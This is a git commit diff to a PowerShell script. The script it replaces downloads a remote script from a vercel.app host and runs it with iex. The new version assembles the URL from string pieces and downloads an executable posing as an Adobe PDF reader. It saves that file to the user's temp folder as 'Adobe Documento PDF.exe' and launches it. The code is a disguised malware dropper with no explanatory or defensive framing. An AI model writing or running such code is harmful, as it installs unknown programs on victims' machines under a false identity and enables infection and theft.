3fd40a0950e5651cdff9cb238c17150dd9c7d23c
Gabriel Rebouças <89884709+gabrielreboucas2001@users.noreply.github.com>
2025-07-15 22:29:55 -0300

    Update arquivo.ps1

--- arquivo.ps1
+++ arquivo.ps1
@@ -1,3 +1,5 @@
-$payload = "https://testando123-blond.vercel.app/payload.ps1"
-$bytes = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content
-iex ([System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($bytes)))
+$u = 'https' + '://' + 'testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe'
+$n = [System.IO.Path]::Combine($env:TEMP, ('Adobe' + [char]32 + 'Documento' + [char]32 + 'PDF.exe'))
+$w = (New-Object Net.WebClient)
+$w.DownloadFile($u, $n)
+(Start-Process -FilePath $n)
